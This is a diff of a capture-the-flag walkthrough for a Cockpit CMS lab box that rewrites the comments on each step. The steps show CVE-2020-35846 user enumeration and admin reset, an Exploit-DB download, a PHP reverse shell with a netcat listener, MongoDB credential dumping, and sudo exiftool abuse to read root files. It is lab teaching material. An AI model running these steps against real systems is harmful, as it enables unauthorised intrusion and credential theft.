@@ -46,8 +46,8 @@ sudo exiftool -filename=/home/stux/root.txt /root/root.txt ? root flag
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run an Nmap scan to discover open ports and services.
+# Why here: identify the attack surface (Apache and Cockpit CMS).
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,80 $TARGET -oA service
 ```
@@ -64,8 +64,8 @@ See [nmap.md](../../tools/recon/nmap.md).
 ## 2. Cockpit Fingerprint
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: retrieve package.json to fingerprint the Cockpit CMS version for CVE-2020-35846.
 curl -s http://$TARGET/package.json | grep version
 # "version": "0.11.1"
 ```
@@ -73,8 +73,8 @@ curl -s http://$TARGET/package.json | grep version
 Cockpit CMS = 0.11.1 is vulnerable to **CVE-2020-35846** (unauth user enumeration + password reset via NoSQL operator injection).
 
 ```bash
-# What it does: searches for or copies a local Exploit-DB PoC.
-# Why here: relate the detected version to a reusable exploit.
+# What it does: search the local Exploit-DB for known vulnerabilities.
+# Why here: find an automated exploit for the specific version of Cockpit CMS detected.
 searchsploit cockpit cms
 # Cockpit CMS 0.11.1 - 'Username' Enumeration / NoSQL Injection (50185)
 ```
@@ -89,11 +89,8 @@ Full technique: [cockpit-cms-rce.md](../../exploits/web-rce/cockpit-cms-rce.md).
 
 ### 3a. Enumerate users + reset admin
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
-curl -fsSL https://www.exploit-db.com/raw/50185 -o enumeration.py
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: run the Cockpit CMS exploit script.
+# Why here: enumerate valid usernames and reset the admin password to regain control of the CMS.
 python3 enumeration.py http://$TARGET
 # [+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']
 # (interactive prompt ? reset admin's password to NEW_PASS)
@@ -113,19 +110,19 @@ http://$TARGET/storage/uploads/2026/04/29/69f24f45d48fbshell.php
 
 ### 3c. Trigger
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a netcat listener.
+# Why here: capture the incoming PHP reverse shell from the Cockpit Assets upload.
 nc -lvnp 4444
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: trigger the uploaded PHP shell.
+# Why here: execute the bash reverse shell payload and land the www-data foothold.
 curl http://$TARGET/storage/uploads/2026/04/29/69f24f45d48fbshell.php
 # whoami ? www-data
 ```
 
 Stabilise:
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: spawn an interactive bash shell using Python.
+# Why here: stabilize the raw netcat shell to allow for tab completion and job control.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 # Ctrl+Z
@@ -164,8 +161,8 @@ pgrep -a mongod
 Full technique: [mongodb-enumeration.md](../../exploits/creds/mongodb-enumeration.md).
 
 ```bash
-# What it does: usa un cliente o herramienta de volcado de base de datos.
-# Why here: enumerar datos y extraer credenciales o estado de la app.
+# What it does: connect to the MongoDB service.
+# Why here: enumerate the 'sudousersbak' database to find the user 'stux' credentials.
 mongo
 > show dbs
 admin     0.000GB
@@ -189,8 +186,8 @@ user
 ```bash
 su stux
 # (or) ssh stux@$TARGET
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: read flags or configuration files recovered during the exploitation.
 cat /home/stux/user.txt
 ```
 
@@ -203,16 +200,16 @@ Tools: [mongo](../../tools/database/mongo.md).
 Full technique: [exiftool-sudo-cve-2021-22204.md](../../exploits/privesc-linux/exiftool-sudo-cve-2021-22204.md).
 
 ```bash
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: list sudo privileges for the current user.
+# Why here: check for allowed commands (like exiftool) that can lead to privilege escalation.
 sudo -l
 # (root) NOPASSWD: /usr/bin/exiftool *
 
-# What it does: ejecuta exiftool con privilegios sudo.
-# Why here: abusar escritura/parseo de archivos para leer o ejecutar como root.
+# What it does: abuse exiftool's -filename flag under sudo.
+# Why here: move the root-owned flag file into a readable location in the stux user's home directory.
 sudo exiftool -filename=/home/stux/root.txt /root/root.txt
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: read flags or configuration files recovered during the exploitation.
 cat /home/stux/root.txt
 # <root flag>
 ```
